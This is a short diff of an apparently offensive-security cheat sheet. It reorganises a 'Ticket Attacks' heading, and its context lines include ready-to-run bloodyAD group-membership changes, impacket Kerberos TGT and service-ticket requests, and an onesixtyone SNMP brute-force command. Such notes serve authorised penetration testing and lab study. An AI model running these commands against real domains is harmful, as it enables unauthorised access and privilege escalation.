@@ -327,6 +327,8 @@ bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember
 
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
 
+<b>Ticket Attacks</b>
+
 KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
 [libdefaults]
     default_realm = $KRB5DOM
@@ -347,11 +349,6 @@ KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5
 TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $TGT"; export KRB5CCNAME="$TGT"; chmod 0600 "$TGT"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
-
-## Ticket Attacks
-
-## Silver Ticket
-
 
 [*] (161) SNMP
 (onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
